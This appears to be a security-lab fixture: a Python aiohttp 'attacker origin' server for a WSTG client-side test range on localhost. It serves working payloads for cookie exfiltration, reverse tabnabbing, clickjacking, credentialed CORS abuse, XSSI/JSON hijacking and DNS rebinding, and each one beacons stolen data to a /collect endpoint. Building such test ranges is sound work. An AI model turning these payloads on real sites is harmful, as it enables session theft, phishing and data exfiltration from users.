"""Attacker/collaborator origin for WSTG M09 (intentionally malicious, in-range).

Serves attack pages on :8901 and records exfiltration callbacks at /collect.
Also listens on :8902 to serve the DNS-rebinding stage-1 page (same port as the
internal victim service, different IP - that is the whole point of rebinding).
"""
import json
import time

from aiohttp import web

VICTIM = "http://127.0.0.1:8900"
SELF = "http://127.0.0.1:8901"
RECORDS = []


def _html(body, title="attacker"):
    return web.Response(text=f"<!DOCTYPE html><html><head><title>{title}</title></head>"
                             f"<body>{body}</body></html>", content_type="text/html")


async def collect(request):
    params = dict(request.query)
    body = await request.text()
    RECORDS.append({
        "token": params.get("token", ""),
        "params": params,
        "body": body,
        "path": request.path,
        "origin": request.headers.get("Origin", ""),
        "referer": request.headers.get("Referer", ""),
        "host": request.headers.get("Host", ""),
        "ts": time.time(),
    })
    resp = web.Response(text="ok", headers={"Access-Control-Allow-Origin": "*"})
    return resp


async def records(request):
    token = request.query.get("token", "")
    return web.Response(text=json.dumps([r for r in RECORDS if r["token"] == token]),
                        content_type="application/json",
                        headers={"Access-Control-Allow-Origin": "*"})


async def reset(request):
    RECORDS.clear()
    return web.Response(text="ok")


async def health(request):
    return web.Response(text="ok")


async def blank(request):
    return _html("<h1>attacker blank page</h1>")


async def evil_js(request):
    return web.Response(text="""
window.__attacker_loaded = true;
new Image().src = 'http://127.0.0.1:8901/collect?token=' + (window.__tok || '') +
  '&evil=1&origin=' + encodeURIComponent(location.origin) +
  '&cookie=' + encodeURIComponent(document.cookie);
""", content_type="application/javascript",
        headers={"Access-Control-Allow-Origin": "*"})


async def phish(request):
    return _html("<h1 id='phish'>ATTACKER-PHISH-PAGE</h1><p>Looks like AcmeClient, is not.</p>")


async def tabnab(request):
    return _html("""
<h1>Partner portal</h1>
<script>
  // reverse tabnabbing: navigate the opener to a phishing page
  if (window.opener) { window.opener.location = 'http://127.0.0.1:8901/phish'; }
</script>""")


async def clickjack(request):
    victim = request.query.get("victim", VICTIM)
    return _html(f"""
<h1>YOU WON A PRIZE</h1>
<button id="decoy" style="position:absolute;left:20px;top:150px;z-index:1;
  padding:20px;font-size:20px">CLAIM REWARD</button>
<iframe id="vj" src="{victim}/account/settings"
  style="position:absolute;left:0;top:0;width:900px;height:700px;opacity:0.001;z-index:2"></iframe>
""")


async def cors_attack(request):
    token = request.query.get("token", "")
    return _html(f"""
<h1>CORS attack</h1>
<script>
  var T = '{token}';
  function beacon(kind, data) {{
    new Image().src = '{SELF}/collect?token=' + T + '&kind=' + kind +
      '&data=' + encodeURIComponent(JSON.stringify(data));
  }}
  ['reflect', 'regex'].forEach(function (k) {{
    fetch('{VICTIM}/api/cors/' + k, {{credentials: 'include'}})
      .then(function (r) {{ return r.json(); }})
      .then(function (d) {{ beacon(k, d); }})
      .catch(function (e) {{ beacon(k + '-err', String(e)); }});
  }});
  // ACAO:* cannot be combined with credentials - read it uncredentialed
  fetch('{VICTIM}/api/cors/wildcard', {{credentials: 'omit'}})
    .then(function (r) {{ return r.json(); }})
    .then(function (d) {{ beacon('wildcard', d); }})
    .catch(function (e) {{ beacon('wildcard-err', String(e)); }});
  // sandboxed iframe -> Origin: null
  var f = document.createElement('iframe');
  f.sandbox = 'allow-scripts';
  f.srcdoc = "<script>fetch('{VICTIM}/api/cors/null', {{credentials: 'include'}})" +
    ".then(function (r) {{ return r.json(); }})" +
    ".then(function (d) {{ parent.postMessage({{null: d}}, '*'); }})" +
    ".catch(function (e) {{ parent.postMessage({{nullerr: String(e)}}, '*'); }})<\\/script>";
  document.body.appendChild(f);
  window.addEventListener('message', function (e) {{
    if (e.data && e.data.null) {{ beacon('null', e.data.null); }}
    if (e.data && e.data.nullerr) {{ beacon('null-err', e.data.nullerr); }}
  }});
</script>""")


async def xssi(request):
    token = request.query.get("token", "")
    return _html(f"""
<h1>XSSI attack</h1>
<script>
  var T = '{token}';
  var leaks = {{}};
  function beacon() {{
    new Image().src = '{SELF}/collect?token=' + T + '&xssi=' +
      encodeURIComponent(JSON.stringify(leaks));
  }}
  window.jp = function (d) {{ leaks.jsonp = d; }};
  // historical JSON-hijacking: shadow the Array constructor before inclusion
  var arrCapture = [];
  function Array() {{ arrCapture.push(this); }}
</script>
<script src="{VICTIM}/api/private.js"></script>
<script src="{VICTIM}/api/jsonp?callback=jp"></script>
<script src="{VICTIM}/api/orders"></script>
<script>
  leaks.private = (typeof PRIVATE_DATA !== 'undefined') ? PRIVATE_DATA : null;
  leaks.arrayHijackFired = arrCapture.length > 0;
  beacon();
</script>""")


async def rebind_stage(request):
    token = request.query.get("token", "")
    return _html(f"""
<h1 id="rebind-stage">attacker stage-1 page (pre-rebind)</h1>
<pre id="result">waiting for rebind...</pre>
<script>
  var T = '{token}';
  // same-origin fetch: after the DNS flip this hits the INTERNAL service,
  // but the browser still considers it same-origin with this attacker page.
  var timer = setInterval(function () {{
    fetch('/internal/secret').then(function (r) {{
      if (!r.ok) {{ throw new Error('not yet'); }}
      return r.json();
    }}).then(function (d) {{
      clearInterval(timer);
      document.getElementById('result').textContent = JSON.stringify(d);
      new Image().src = '{SELF}/collect?token=' + T + '&rebind=' +
        encodeURIComponent(JSON.stringify(d));
    }}).catch(function () {{}});
  }}, 400);
</script>""")


def make_app():
    app = web.Application()
    app.router.add_route("*", "/collect", collect)
    app.router.add_get("/records", records)
    app.router.add_route("*", "/reset", reset)
    app.router.add_get("/health", health)
    app.router.add_get("/blank", blank)
    app.router.add_get("/evil.js", evil_js)
    app.router.add_get("/phish", phish)
    app.router.add_get("/tabnab", tabnab)
    app.router.add_get("/clickjack", clickjack)
    app.router.add_get("/cors-attack", cors_attack)
    app.router.add_get("/xssi", xssi)
    app.router.add_get("/", rebind_stage)
    return app


async def main():
    runner = web.AppRunner(make_app())
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", 8901).start()
    await web.TCPSite(runner, "0.0.0.0", 8902).start()  # rebinding stage-1 listener
    import asyncio
    await asyncio.Event().wait()


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())